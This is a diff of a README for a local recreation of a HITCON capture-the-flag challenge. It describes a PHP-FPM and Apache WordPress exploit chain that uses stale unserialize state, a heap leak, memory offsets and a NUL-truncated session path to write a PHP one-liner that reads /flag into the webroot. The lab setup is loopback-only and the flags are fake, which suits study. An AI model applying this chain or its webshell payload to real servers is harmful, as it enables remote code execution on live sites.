@@ -1,39 +1,53 @@
-# PHP2Shell - full local three-instance recreation
+# PHP2Shell - full local three-profile recreation
 
-This repo now runs a complete **local 3/3 recreation** of the HITCON challenge shape:
+This repository runs a complete **local 3/3 recreation** of the HITCON challenge shape:
 
-- two fresh Nginx/PHP-FPM/WordPress instances;
-- one fresh Apache/mod_php/WordPress instance;
-- one different dummy flag from each instance.
+- one pinned Nginx/PHP-FPM 8.3.35/WordPress 7.1.3 target;
+- one pinned Nginx/PHP-FPM 8.5.11/WordPress 6.9.10 target;
+- one pinned Apache/mod_php 8.4.26/WordPress 7.0.7 target;
+- one different dummy flag from each target.
 
-This still is not an authentic HITCON solve. The organizer image and live instancer were never available, so the Docker profiles here are pinned local clones and the three flags are deliberately fake.
+This is not an authentic HITCON solve. The organizer image and live instancer were unavailable. Every profile is a local clone and every flag is deliberately fake.
 
-## What is solved locally
+## Profile status
 
-`solve_all.py` builds and destroys each target separately. The two FPM runs start with clean databases, clean WordPress volumes, new workers and different ASLR heap bases. The Apache run uses the stock 150-worker prefork layout and pins 149 workers so A1, B1, A2 and B2 reach the same child.
+| Profile | PHP | WordPress | Result | Geometry |
+| --- | ---: | ---: | --- | --- |
+| `fpm83` | 8.3.35 | 7.1.3 | Full local dummy-flag read | `P-B=0x8662000`, `Q-B=0x742d9d8` |
+| `fpm85` | 8.5.11 | 6.9.10 | Full local dummy-flag read | Bounded local P/Q candidate sets |
+| `fpm84` probe | 8.4.26 | 6.9.10 | Rejected | Tail leak returned filler, not pointers |
+| `apache-wordpress` | 8.4.26 | 7.0.7 | Full local dummy-flag copy | Public A1/B1/A2/B2 geometry |
+
+Both supported FPM solvers fingerprint PHP, WordPress and the relevant INI settings before using profile-specific payload geometry. They only accept loopback targets and have no remote-host mode.
 
 ```text
-FPM instance A -> seed -> leak -> R2a -> R2b -> R3 -> flag A
-FPM instance B -> seed -> leak -> R2a -> R2b -> R3 -> flag B
-Apache instance -> A1 -> B1 leak -> A2 -> B2 -> flag C
+FPM 8.3 -> seed -> leak -> R2a -> R2b -> R3 -> flag A
+FPM 8.5 -> seed -> leak -> R2a -> R2b -> R3 -> flag B
+Apache  -> A1 -> B1 leak -> A2 -> B2 -> flag C
 ```
 
-No exploit stage uses GDB. Docker is used only to build/restart the local labs and to check local FPM worker/session state that would not be available remotely.
+No exploit stage uses GDB. Docker is used to build/restart the local labs and to verify local FPM worker/session state that would not be available remotely.
 
 ## Files
 
 ```text
 .
-├── solve_all.py          # builds all three targets and collects 3/3 flags
-├── solve.py              # one complete FPM chain
-├── payloads.py           # FPM multipart builders
+├── solve_all.py              # builds all supported profiles and collects 3/3 flags
+├── solve.py                  # PHP 8.5 FPM chain
+├── payloads.py               # PHP 8.5 multipart builders
+├── profiles/fpm83/
+│   ├── solve.py              # PHP 8.3 FPM chain
+│   ├── payloads.py           # pure PHP 8.3 payload builders
+│   ├── Dockerfile
+│   └── compose.yaml
 ├── apache/
-│   ├── solve.py          # Apache A1/B1/A2/B2 chain
-│   └── payloads.py       # Apache payload builders
+│   ├── solve.py              # Apache A1/B1/A2/B2 chain
+│   └── payloads.py           # Apache payload builders
 ├── lab/
-│   ├── compose.yaml      # one disposable FPM target
-│   └── apache/           # disposable Apache/WordPress target
-└── evidence/             # sanitized successful local results
+│   ├── compose.yaml          # disposable PHP 8.5 FPM target
+│   ├── install.py            # loopback WordPress installer/primer
+│   └── apache/               # disposable Apache/WordPress target
+└── evidence/                 # sanitized results and rejected-profile evidence
 ```
 
 No third-party Python package is required.
@@ -45,9 +59,7 @@ Requirements:
 - Docker with Compose;
 - Python 3.11+;
 - around 4 GB free memory for the 150-worker Apache profile;
-- loopback ports `18233` and `18322` available; the two FPM instances run sequentially on `18233`.
-
-Run `solve_all.py` inside the same Linux or WSL environment that owns the Docker daemon. The Apache relay connects directly to the container's internal IP.
+- loopback ports `18234`, `18233` and `18322` available.
 
 The offline plan does not start containers or send requests:
 
@@ -61,191 +73,142 @@ Run the complete local recreation:
 python3 solve_all.py --execute
 ```
 
-A successful run ends with:
+If Docker Desktop is exposed through the Windows CLI rather than a WSL Docker socket:
 
-```text
-hitcon{local_fpm_instance_a_do_not_submit}
-hitcon{local_fpm_instance_b_do_not_submit}
-hitcon{local_apache_instance_do_not_submit}
-3/3 local dummy flags
+```bash
+python3 solve_all.py --execute --docker-command docker.exe
 ```
 
-The runner tears down every container, network and database volume after its profile finishes. Request/response evidence stays under `runs/full-local-*/`.
+A successful run returns:
 
-## Running one FPM instance by itself
+```text
+hitcon{local_fpm83_instance_do_not_submit}
+hitcon{local_fpm85_instance_do_not_submit}
+hitcon{local_apache_instance_do_not_submit}
+3/3 local dummy flags across three pinned profiles
+```
 
-### Starting the FPM lab
+The runner tears down each container, network and database volume unless `--keep-labs` is supplied. Request/response evidence stays under `runs/full-local-*/` and is ignored by Git.
 
-Requirements:
+## PHP 8.5 profile
 
-- Docker with Compose
-- Python 3.11+
-- around 2 GB free memory
-- port `18233` free on loopback
-
-Copy the calibrated loopback environment file. These credentials are only for the disposable Docker database:
+Copy the disposable database configuration, build the target and install WordPress:
 
 ```bash
 cp lab/.env.example lab/.env
-```
-
-Now build the lab and install WordPress:
-
-```bash
 docker compose --env-file lab/.env -f lab/compose.yaml up -d --build
-python3 lab/install.py --port 18233
+python3 lab/install.py --port 18233 --title HITCON-LAB-FPM85
 ```
 
-The Docker build downloads WordPress 6.9.10 and checks this SHA-256 before extracting it:
+The image pins PHP 8.5.11 and verifies the WordPress 6.9.10 archive hash:
 
 ```text
 a1c0dc12e2271c6afaabf329d5af7a976f8d2c8c592773178a5baaeafc2d4f4a
 ```
 
-The installer also opens the front page and the block-pattern endpoint. I need both requests once before running the exploit because they set up the WordPress heap shape used by the producer.
-
-## Checking the payloads
-
-Running the solver without `--execute` does not send any request. It only builds the important payloads and prints their hashes:
+Build and inspect the payload plan without sending requests:
 
 ```bash
 python3 solve.py
 ```
 
-The two frozen requests should be:
-
-```text
-producer    275210 bytes  c83dd915943c9f6983ca1e0e83a4074354892982ff2afd6d1507f1f4931283f5
-tail16      217885 bytes  a2d61c04d21b37ad0eb4055320352ce0aefe80ac9b262b30f96ebd6d6c78119f
-```
-
-## Running the exploit
+Run the chain:
 
 ```bash
 python3 solve.py --execute --restart-at-start
 ```
 
-`solve.py` only accepts `127.0.0.1`, `localhost` or `::1`. This code is made for the included disposable lab, not for testing random PHP-FPM servers.
+The solver tries only the bounded locally measured P/Q candidate sets printed by the offline plan. It refuses non-loopback hosts and mismatched PHP/WordPress/INI fingerprints.
 
-A successful run ends with output similar to this:
+## PHP 8.3 profile
 
-```json
-{
-  "success": true,
-  "B": "0x000078ef08200000",
-  "r2a_p_offset": "0x8862000",
-  "r2b_p_offset": "0x8862000",
-  "r3_q_offset": "0x608f00",
-  "expected_marker": "hitcon{local_fpm85_dummy_do_not_submit}"
-}
+Use a five-digit loopback port; `18234` is the default:
+
+```bash
+export DB_PASSWORD=local-test-password
+export DB_ROOT_PASSWORD=local-test-root-password
+export LOCAL_FLAG='hitcon{local_fpm83_dummy_do_not_submit}'
+export LAB_PORT=18234
+docker compose -f profiles/fpm83/compose.yaml up -d --build
+python3 lab/install.py --port 18234 --title HITCON-LAB-FPM83
 ```
 
-The request and response bodies are saved in `runs/<sid>/` so I can inspect a failed stage without running everything again. That directory is ignored by Git.
-
-If Python is running on Windows and Docker is inside WSL, pass the Docker command like this:
-
-```powershell
-py -3 solve.py --execute --restart-at-start `
-  --docker-command "wsl -d <WSL_DISTRO> -u root -- docker"
-```
-
-## How the chain works
-
-### 1. Producer and stale state
-
-The producer request contains 884 depth-60 empty uploads and twenty 256-byte POST values. Its size is exactly `275210` bytes.
-
-The request reaches `php_var_unserialize_init()`, publishes `BG(unserialize).data`, then dies on the PHP memory limit before the matching cleanup. FPM handles the bailout and keeps the child alive, so the next request can reuse the stale decoder state.
-
-### 2. Heap leak
-
-The leak request makes WordPress reflect a 291-byte value inside a search URL. The useful layout is:
+The image pins PHP 8.3.35 and verifies the WordPress 7.1.3 archive hash:
 
 ```text
-56 x "Z" | 14 pointers | 56 x "Z" | -16 | NULL | 51 x "Z"
+d2a09acb6a15e3b9c471d72557753c266d6f41a79ed19bfe04cbfe49e283b2a5
 ```
 
-I URL-decode the reflected value, check the structure and calculate the 2 MiB heap base with:
+Build and inspect the exact payload plan without sending requests:
+
+```bash
+python3 profiles/fpm83/solve.py
+```
+
+Run the chain:
+
+```bash
+python3 profiles/fpm83/solve.py --execute --restart-at-start \
+  --accept-fixed-geometry --port 18234
+```
+
+The explicit acceptance flag is required because this profile uses fixed offsets measured on the pinned image. The solver requires PHP 8.3.35, WordPress 7.1.3, `memory_limit=128M`, upload progress enabled and `/tmp` session storage.
+
+## FPM chain
+
+### Producer and stale decoder state
+
+Each producer reaches `php_var_unserialize_init()`, publishes `BG(unserialize).data`, then hits the 128 MiB memory limit before matching cleanup. FPM handles the bailout and keeps the child alive, allowing the next multipart request to consume stale decoder state.
+
+### Heap leak
+
+WordPress reflects a 291-byte value in the search input. The solver validates the filler boundaries, canonical aligned pointer words and a single 2 MiB chunk base:
 
 ```python
 B = leaked_pointer & ~0x1fffff
 ```
 
-### 3. BIG multipart value
+### R2a and R2b
 
-The replacement-worker stages use one `102375` byte multipart value called `BIG`. The same value is useful in two places:
-
-- the raw bytes at `+0xa000` replace the stale decoder header;
-- the copied value contains the fake entries and destructor data.
-
-These are the offsets measured in this exact lab:
-
-```text
-copied BIG value : B + 0x21a018
-fake entries F   : B + 0x22c018
-fake dtors DT    : B + 0x22d018
-progress object P: B + 0x8862000
-files handler Q  : B + 0x608f00
-```
-
-The fake entries array gives the write I use in all three stages:
+R2a converts the seeded upload-progress value into one scalar root. R2b adds a second empty-array root. Those roots provide one then two controlled decoder stores:
 
 ```text
 F->data[F->used_slots++] = source_zval_pointer
 ```
 
-For an eight-byte target the index is:
+PHP 8.3 records:
 
-```python
-used_slots = (target - (F + 16)) // 8
+```text
+upload_progress_K|b:0;
+upload_progress_K|b:0;upload_progress_J|a:0:{}
 ```
 
-### 4. R2a
-
-R2a writes to `P + 0x50`, which is the type word of the live upload-progress data. After the parser bails out, the saved session becomes:
+PHP 8.5 records:
 
 ```text
 upload_progress_stockdwatch|i:0;
+upload_progress_stockdwatch|i:0;upload_progress_K2stage0001|a:0:{}
 ```
 
-Now there is one scalar root for the next stale decode.
+### R3 webroot write
 
-### 5. R2b
-
-R2b writes to `P + 0x48` and points the progress value at `DT + 16`, where I place an empty HashTable. The session then contains two roots:
-
-```text
-upload_progress_stockdwatch|i:0;
-upload_progress_K2stage0001|a:0:{}
-```
-
-Those two roots give two decoder stores in R3.
-
-### 6. R3 and the webroot write
-
-The first two fields of the files session handler are next to each other:
-
-```c
-zend_string *last_key;  // Q + 0
-zend_string *basedir;   // Q + 8
-```
-
-R3 points both fields at strings inside `BIG`:
-
-```text
-Q + 0 = DT + 16
-Q + 8 = DT + 32
-```
-
-The fake `last_key` forces PHP to reopen the session file. The fake `basedir` contains a path such as `/var/www/html/r3-<sid>.php` followed by a NUL byte. PHP appends its normal session suffix, but the filesystem only sees the part before the NUL.
-
-The tracked upload filename is:
+R3 redirects the files session handler to `/var/www/html/r3-<sid>.php\0`. PHP appends its normal session suffix, while the filesystem sees only the path before the NUL. The tracked upload filename is:
 
 ```php
 <?=readfile('/flag')?>
 ```
 
-Upload-progress serialization writes that string into the redirected session file. The final GET executes it and returns the dummy flag from the local container.
+Upload-progress serialization writes that string into the redirected session file. The final loopback GET executes it and returns the local dummy flag.
+
+## PHP-FPM 8.4 rejection
+
+A clean PHP-FPM 8.4.26/WordPress 6.9.10 probe reached the reflected search value, but the fourteen expected pointer words were all:
+
+```text
+0x5a5a5a5a5a5a5a5a
+```
+
+The canonicality/alignment gate rejected the response. Without a heap base there is no justified P/Q calibration or RCE claim. The sanitized observation is in [`evidence/fpm84-rejected.json`](evidence/fpm84-rejected.json).
 
 ## Apache chain
 
@@ -268,16 +231,22 @@ The selected Apache child normally crashes after the destructor callback, but th
 
 ## Limits
 
-The HTTP response gives me `B`, but it does not give me `P` or `Q`. The two clean FPM runs selected `P-B = 0x8862000` and `0x8662000`; both selected `Q-B = 0x608f00`. These are measured clone offsets, so this is not a portable exploit for arbitrary PHP-FPM installations.
+These are **profile-specific local replays**, not a universal exploit for arbitrary PHP-FPM installations. The HTTP leak discloses `B`; it does not remotely derive every allocator placement. Image version, loaded extensions, allocator state, WordPress state, request geometry and web-server behavior remain part of each profile contract.
 
-The original stale-unserialize idea and indexed `var_entries` write are not mine. The part I worked out here is this local sequence: the raw/copied `BIG` placement, keeping old-base addresses across natural worker replacements, shaping one then two session roots, and finishing with the `ps_files` webroot write under the 1 MiB POST limit.
+The organizer image, real challenge instances, real flags and platform acceptance remain unavailable. Every marker in this repository is local and fake.
 
-The sanitized 3/3 run is in [`evidence/full-local.json`](evidence/full-local.json). Earlier single-profile runs remain in [`evidence/results.json`](evidence/results.json). Every marker is local and fake.
+## Evidence
 
-## Stopping the lab
+- [`evidence/fpm83-local.json`](evidence/fpm83-local.json): clean PHP-FPM 8.3 dummy-flag proof.
+- [`evidence/fpm84-rejected.json`](evidence/fpm84-rejected.json): unsupported PHP-FPM 8.4 leak probe.
+- [`evidence/full-local.json`](evidence/full-local.json): clean versioned 3/3 matrix run.
+- [`evidence/results.json`](evidence/results.json): earlier single-profile local runs.
+
+## Stopping standalone labs
 
 ```bash
 docker compose --env-file lab/.env -f lab/compose.yaml down -v
+docker compose -f profiles/fpm83/compose.yaml down -v
 ```
 
 ## References
@@ -286,4 +255,4 @@ docker compose --env-file lab/.env -f lab/compose.yaml down -v
 - <https://github.com/alvarodh5/php2shell>
 - `9bie/php2shell`, commit `d6f888ebd3f0e188bb662e16f23747afdf35e42f`
 
-The code in this repository is MIT licensed. PHP, WordPress, Nginx and MariaDB keep their own licenses.
+The code in this repository is MIT licensed. PHP, WordPress, Nginx and MariaDB retain their own licenses.
